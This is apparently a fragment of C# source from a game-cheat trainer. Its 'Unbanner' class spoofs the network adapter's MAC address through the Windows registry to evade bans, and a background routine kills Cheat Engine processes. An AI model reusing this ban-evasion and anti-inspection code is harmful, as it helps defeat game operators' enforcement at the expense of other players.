            public Adapter(NetworkInterface i) : this(i.Description)
            {
            }

            public Adapter(string aname)
            {
                adaptername = aname;

                ManagementObjectSearcher searcher = new ManagementObjectSearcher("select * from win32_networkadapter where Name='" + adaptername + "'");
                ManagementObjectCollection found = searcher.Get();
                adapter = found.Cast<ManagementObject>().FirstOrDefault();
                try
                {
                    Match match = Regex.Match(adapter.Path.RelativePath, "\\\"(\\d+)\\\"$");
                    devnum = int.Parse(match.Groups[1].Value);
                }
                catch
                {
                    return;
                }

                customname = NetworkInterface.GetAllNetworkInterfaces().Where(
                  i => i.Description == adaptername
                ).Select(
                  i => " (" + i.Name + ")"
                ).FirstOrDefault();
            }

            public string Mac
            {
                get
                {
                    try
                    {
                        return BitConverter.ToString(ManagedAdapter.GetPhysicalAddress().GetAddressBytes()).Replace("-", "").ToUpper();
                    }
                    catch
                    {
                        return null;
                    }
                }
            }

            public NetworkInterface ManagedAdapter => NetworkInterface.GetAllNetworkInterfaces().Where(nic => nic.Description == adaptername).FirstOrDefault();

            public string RegistryKey => string.Format(@"SYSTEM\ControlSet001\Control\Class\{{4D36E972-E325-11CE-BFC1-08002BE10318}}\{0:D4}", devnum);

            public string RegistryMac
            {
                get
                {
                    try
                    {
                        using (RegistryKey regkey = Registry.LocalMachine.OpenSubKey(RegistryKey, false))
                        {
                            return regkey.GetValue("NetworkAddress").ToString();
                        }
                    }
                    catch
                    {
                        return null;
                    }
                }
            }

            public static string GetNewMac()
            {
                Random r = new Random();

                byte[] bytes = new byte[6];
                r.NextBytes(bytes);

                bytes[0] = (byte)(bytes[0] | 0x02);

                bytes[0] = (byte)(bytes[0] & 0xfe);

                return MacToString(bytes);
            }

            public static bool IsValidMac(string mac, bool actual)
            {
                if (mac.Length != 12)
                {
                    return false;
                }

                if (mac != mac.ToUpper())
                {
                    return false;
                }

                if (!Regex.IsMatch(mac, "^[0-9A-F]*$"))
                {
                    return false;
                }

                if (actual)
                {
                    return true;
                }

                char c = mac[1];
                return c == '2' || c == '6' || c == 'A' || c == 'E';
            }

            public static bool IsValidMac(byte[] bytes, bool actual)
            {
                return IsValidMac(Adapter.MacToString(bytes), actual);
            }

            public static string MacToString(byte[] bytes)
            {
                return BitConverter.ToString(bytes).Replace("-", "").ToUpper();
            }

            public bool SetRegistryMac(string value)
            {
                bool shouldReenable = false;

                try
                {
                    if (value.Length > 0 && !Adapter.IsValidMac(value, false))
                    {
                        throw new Exception(value + " is not a valid mac address");
                    }

                    using (RegistryKey regkey = Registry.LocalMachine.OpenSubKey(RegistryKey, true))
                    {
                        if (regkey == null)
                        {
                            throw new Exception("Failed to open the registry key");
                        }

                        if ((regkey.GetValue("AdapterModel") as string) != adaptername &&
                          (regkey.GetValue("DriverDesc") as string) != adaptername)
                        {
                            throw new Exception("Adapter not found in registry");
                        }

                        uint result = (uint)adapter.InvokeMethod("Disable", null);
                        if (result != 0)
                        {
                            throw new Exception("Failed to disable network adapter.");
                        }

                        shouldReenable = true;

                        if (value.Length > 0)
                        {
                            regkey.SetValue("NetworkAddress", value, RegistryValueKind.String);
                        }
                        else
                        {
                            regkey.DeleteValue("NetworkAddress");
                        }

                        return true;
                    }
                }
                catch (Exception ex)
                {
                    _ = MessageBox.Show(ex.ToString(), "FreeZeHAX Trainer");
                    return false;
                }
                finally
                {
                    if (shouldReenable)
                    {
                        uint result = (uint)adapter.InvokeMethod("Enable", null);
                        if (result != 0)
                        {
                            _ = MessageBox.Show("Failed to re-enable network adapter.", "FreeZeHAX Trainer");
                        }
                    }
                }
            }

            public override string ToString()
            {
                return adaptername + customname;
            }
        }

        #endregion Unbanner Class

        #region Kill CEs
        private void CEKill_DoWork(object sender, System.ComponentModel.DoWorkEventArgs e)
        {
            while (!e.Cancel)
            {
                foreach (string CEs in others.CE)
                {
                    Regex regex = new Regex(CEs);
                    foreach (Process p in Process.GetProcesses("."))
                    {
                        if (regex.Match(p.ProcessName).Success)
                        {
                            IsCEOpen = mem.OpenProcess(p.ProcessName);
                        }
                    }
                }
                System.Threading.Thread.Sleep(1000);
                CEKill.ReportProgress(0);
            }
        }

        private void CEKill_ProgressChanged(object sender, System.ComponentModel.ProgressChangedEventArgs e)
        {
            if (IsCEOpen == true)
            {
                try
                {
                    foreach (string CEs in others.CE)
                    {
                        Regex regex = new Regex(CEs);
                        foreach (Process p in Process.GetProcesses("."))
                        {
                            if (regex.Match(p.ProcessName).Success)
                            {
                                p.Kill();
                            }
                        }
                    }
                }
                catch (Exception) { }
                Application.Exit();
            }
        }

        private void CEKill_RunWorkerCompleted(object sender, System.ComponentModel.RunWorkerCompletedEventArgs e)
        {
            CEKill.RunWorkerAsync();
        }
        #endregion Kill CEs
    }
}